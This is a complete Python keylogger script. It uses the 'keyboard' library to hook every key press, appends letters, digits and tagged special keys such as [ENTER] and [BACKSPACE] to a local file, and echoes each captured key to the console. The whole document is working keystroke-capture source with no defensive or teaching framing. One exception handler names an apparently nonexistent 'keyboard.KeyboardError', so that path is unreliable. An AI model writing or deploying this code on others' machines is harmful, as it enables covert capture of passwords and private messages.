import keyboard
def on_press(event):
    try:
        with open('keylogs.txt', 'a') as f:
            print(f'Key captured: {event.name}')
            if event.name.isalnum():
                f.write(event.name)
            elif event.name == 'space':
                f.write(' ')
            elif event.name in ['enter']:
                f.write('[ENTER]')
            elif event.name in ['shift', 'shift_l', 'shift_r']:
                if event.event_type == 'down':
                    f.write('[SHIFT]')
            elif event.name in ['tab']:
                f.write('[TAB]')
            elif event.name in ['esc']:
                f.write('[ESC]')
            elif event.name in ['backspace']:
                f.write('[BACKSPACE]')
            # Add more special keys as needed
    except OSError as e:
        print(f'File Error: {str(e)}')
    except keyboard.KeyboardError as ke:
        print(f'Keyboard Event Error: {str(ke)}')
keyboard.on_press(on_press)
try:
    keyboard.wait()
except KeyboardInterrupt:
    print('Keylogger stopped by user.')
